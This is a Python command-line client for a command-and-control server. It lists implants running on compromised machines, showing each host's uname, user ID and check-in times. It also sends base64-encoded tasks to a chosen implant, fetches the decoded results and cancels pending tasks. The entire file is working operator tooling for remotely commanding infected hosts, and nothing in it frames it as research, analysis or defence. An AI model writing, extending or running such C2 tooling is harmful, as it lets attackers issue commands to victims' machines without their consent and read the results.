import argparse
import base64
import json
import requests

API_URL = 'http://127.0.0.1:5000' # c2 base url


def list_agents():
    url = f'{API_URL}/list_implants'
    response = requests.get(url)
    if response.status_code == 200:
        agents = json.loads(response.text)['implants']
        print('='*20)
        for agent in agents:
            print("Machine ID: " + agent['implant_machine_id'])
            print("uname -a: " + base64.b64decode(agent['implant_uname']).decode())
            print("user id: " + base64.b64decode(agent['implant_user']).decode())
            print("First Seen: " + agent['first_seen'])
            print("Last Seen: " + agent['last_seen'])
            print("Build ID: " + agent['implant_build_id'])
            print('='*20)
    else:
        print(f'Error: {response.status_code}')



def get_tasks(args):
    params = {}
    if args.agent_id:
        params['machine_id'] = args.agent_id
    url = f'{API_URL}/list_tasks'
    response = requests.get(url, params=params)
    if response.status_code == 200:
        tasks = json.loads(response.text)['tasks']
        for task in tasks:
            task_status = {
                0: 'Task Pending',
                1: 'Task In Progress',
                2: 'Task Executed',
                3: 'Task Cancelled'
            }[task['task_status']]
            task_data = base64.b64decode(task['task_data']).decode()
            print(f'Machine ID: {task["implant_machine_id"]}')
            print(f'Task UUID: {task["task_uuid"]}')
            print(f'Created Time: {task["task_created_time"]}')
            print(f'Executed Time: {task["task_executed_time"]}')
            print(f'Status: {task_status}')
            print(f'Data: {task_data}\n')
            print("="*20)
    else:
        print(f'Error: {response.status_code}')


import base64

def submit_task(args):
    if not args.agent_id:
        raise ValueError("agent is required to submit a task")
    
    task_data_plain = args.task_data
    
    url = f"{API_URL}/submit_task"

    task_data = base64.b64encode(task_data_plain.encode("utf-8")).decode("utf-8")
    data = {"task_data": task_data, "implant_machine_id": args.agent_id}

    response = requests.post(url, data=data)
    response.raise_for_status()

    json_response = response.json()
    implant_machine_id = json_response["implant_machine_id"]
    task_uuid = json_response["task_uuid"]

    print(f"Task submitted with implant_machine_id: {implant_machine_id} and task_uuid: {task_uuid}")


def get_output(args):
    if not args.task_uuid:
        raise ValueError("Task UUID must be provided.")

    url = f"{API_URL}/get_output?task_uuid={args.task_uuid}"
    response = requests.get(url)

    if response.status_code == 404:
        print("Task does not exist!")
        return
    elif response.status_code == 200:
        data = response.json()

        print("Machine ID:", data["implant_machine_id"])
        print("Task UUID:", data["task_uuid"])

        task_data = base64.b64decode(data["task_data"]).decode("utf-8")
        print("Task Data:", task_data)

        print("Task Created Time:", data["task_created_time"])
        print("Task Executed Time:", data["task_executed_time"])

        task_result = base64.b64decode(data["task_result"]).decode("utf-8")
        print("Task Result:")
        print(task_result)
        print()

        if "error" in data:
            print("Task could not be retrieved.")
            return
        else:
            print("Task retrieved successfully.")
            return
    else:
        print("Error occurred during request.")
        return


def cancel(args):
    if not args.task_uuid:
        print("Error: task_uuid is required!")
        return

    params = {'task_uuid': args.task_uuid}
    response = requests.get(f'{API_URL}/cancel_task', params=params)

    if response.status_code == 404:
        print("Task does not exist!")
    elif response.status_code == 200:
        response_json = response.text # yeah we ain't parsing this shit.
        if "error" in response_json:
            print("Error: Could not cancel task!")
        elif "success" in response_json:
            print("Task was cancelled successfully!")
    else:
        print("Error: Unexpected response from server.")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='C2 API client')
    parser.add_argument('--list-agents', action='store_true', help='List all agents')
    parser.add_argument('--agent', dest='agent_id', help='Agent ID')
    parser.add_argument('--get-tasks', action='store_true', help='Get tasks for the specified agent')
    parser.add_argument('--submit-task', dest='task_data', help='Submit a task')
    parser.add_argument('--task', dest='task_uuid', help='Task UUID')
    parser.add_argument('--get-output', action='store_true', help='Get output for the specified task')
    parser.add_argument('--cancel', action='store_true', help='Cancel the specified task')
    args = parser.parse_args()

    if args.list_agents:
        list_agents()
    elif args.get_tasks:
        get_tasks(args)
    elif args.task_data:
        submit_task(args)
    elif args.get_output:
        get_output(args)
    elif args.cancel:
        cancel(args)
    else:
        parser.print_help()
